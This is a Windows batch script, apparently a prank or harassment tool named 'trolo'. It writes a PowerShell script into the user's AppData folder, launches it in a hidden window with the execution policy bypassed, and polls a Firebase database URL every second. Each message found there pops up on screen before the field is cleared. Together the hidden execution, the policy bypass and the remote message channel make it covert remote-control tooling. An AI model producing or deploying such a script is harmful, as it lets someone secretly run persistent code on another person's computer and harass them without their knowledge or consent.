@echo off
setlocal

set "folderPath=%APPDATA%\TroloFolder"
set "ps1File=%folderPath%\trolo.ps1"

if not exist "%folderPath%" (
    mkdir "%folderPath%"
)

echo $firebaseUrl = "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" > "%ps1File%"
echo function Check-WiFi { >> "%ps1File%"
echo     $networkStatus = Get-NetAdapter ^| Where-Object { $_.Status -eq "Up" } >> "%ps1File%"
echo     return ($networkStatus -ne $null) >> "%ps1File%"
echo } >> "%ps1File%"
echo while ($true) { >> "%ps1File%"
echo     try { >> "%ps1File%"
echo         if (Check-WiFi) { >> "%ps1File%"
echo             $response = Invoke-RestMethod -Uri $firebaseUrl -Method Get >> "%ps1File%"
echo             if ($response.message -ne "") { >> "%ps1File%"
echo                 Add-Type -AssemblyName PresentationFramework >> "%ps1File%"
echo                 [System.Windows.MessageBox]::Show($response.message, "M", 0, "Information") >> "%ps1File%"
echo                 $emptyPayload = @{ message = "" } ^| ConvertTo-Json -Depth 1 >> "%ps1File%"
echo                 Invoke-RestMethod -Uri $firebaseUrl -Method Patch -Body $emptyPayload -ContentType "application/json" >> "%ps1File%"
echo             } >> "%ps1File%"
echo         } >> "%ps1File%"
echo     } catch { >> "%ps1File%"
echo         Write-Host "Error polling Firebase or WiFi unavailable: $_" >> "%ps1File%"
echo     } >> "%ps1File%"
echo     Start-Sleep -Seconds 1 >> "%ps1File%"
echo } >> "%ps1File%"

powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"%ps1File%\"' -WindowStyle Hidden"

endlocal
